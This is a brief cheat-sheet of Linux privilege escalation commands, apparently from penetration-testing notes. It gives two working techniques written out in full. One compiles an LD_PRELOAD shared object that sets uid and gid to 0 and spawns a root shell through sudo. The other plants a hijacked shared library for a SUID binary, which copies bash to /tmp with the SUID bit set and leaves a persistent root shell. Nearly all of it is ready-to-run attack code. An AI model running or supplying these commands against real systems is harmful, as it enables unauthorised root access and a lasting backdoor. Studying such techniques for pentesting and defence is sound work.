commands.command:
# Check: sudo -l shows 'env_keep+=LD_PRELOAD'
# Create /tmp/pe.c:
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# Create /path/to/.config/libcalc.c:
cat > /tmp/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject(){ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
EOF
gcc -shared -o /path/to/.config/libcalc.so -fPIC /tmp/libcalc.c
# Then run the SUID binary
